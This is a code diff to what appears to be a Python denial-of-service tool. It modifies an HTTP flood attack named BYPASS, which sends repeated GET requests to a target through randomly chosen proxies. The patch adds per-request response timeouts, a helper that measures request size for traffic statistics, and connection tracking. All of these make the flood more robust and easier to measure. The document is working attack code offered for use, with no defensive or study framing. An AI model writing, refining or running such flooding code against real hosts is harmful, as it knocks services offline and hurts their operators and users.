@@ -863,6 +863,12 @@ class HttpFlood:
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
 
 
+def request_info_size(request: aiohttp.RequestInfo) -> int:
+    headers = "\r\n".join(f"{k}: {v}" for k, v in request.headers.items())
+    status_line = f"{request.method} {request.url} HTTP/1.1"
+    return len(f"{status_line}\r\n{headers}\r\n\r\n".encode())
+
+
 class AttackSettings:
     TRANSPORT_STREAM = "stream"
     TRANSPORT_SOCK = "sock"
@@ -871,6 +877,7 @@ class AttackSettings:
     connect_timeout_seconds: float
     drain_timeout_seconds: float
     close_timeout_seconds: float
+    http_response_timeout_seconds: float
     requests_per_connection: int
 
     def __init__(
@@ -880,12 +887,14 @@ class AttackSettings:
         connect_timeout_seconds: float = SOCK_TIMEOUT,
         drain_timeout_seconds: float = 0.1,
         close_timeout_seconds: float = 1.0,
+        http_response_timeout_seconds: float = 15.0,
         requests_per_connection: int = 1024,
     ):
         self.transport = transport
         self.connect_timeout_seconds = connect_timeout_seconds
         self.drain_timeout_seconds = drain_timeout_seconds
         self.close_timeout_seconds = close_timeout_seconds
+        self.http_response_timeout_seconds = http_response_timeout_seconds
         self.requests_per_connection = requests_per_connection
 
     @property
@@ -1066,20 +1075,24 @@ class AsyncTcpFlood(HttpFlood):
         )
         return await self._generic_flood(payload)
 
-    # XXX: timeout for each request
     @scale_attack(factor=3)
     async def BYPASS(self) -> bool:
         connector = self._proxies.pick_random_connector()
         packets_sent = 0
-        async with aiohttp.ClientSession(connector=connector) as s:
+        timeout = aiohttp.ClientTimeout(connect=self._settings.connect_timeout_seconds)
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
             self._stats.track_open_connection() # not exactly the connection though
-            for _ in range(self._rpc):
-                async with s.get(self._target.human_repr()) as response:
-                    # XXX: this could be optimized by reading chunks
-                    await response.text()
-                    # XXX: we need to track in/out traffic separately
-                    self._stats.track(1, len(self._target.human_repr()))
-                    packets_sent += 1
+            try:
+                for _ in range(self._settings.requests_per_connection):
+                    async with s.get(self._target.human_repr()) as response:
+                        self._stats.track(1, request_info_size(response.request_info))
+                        packets_sent += 1
+                        # XXX: we need to track in/out traffic separately
+                        await asyncio.wait_for(
+                            response.read(),
+                            timeout=self._settings.http_response_timeout_seconds)
+            finally:
+                self._stats.track_close_connection()
         return packets_sent > 0
     
     @scale_attack(factor=2)
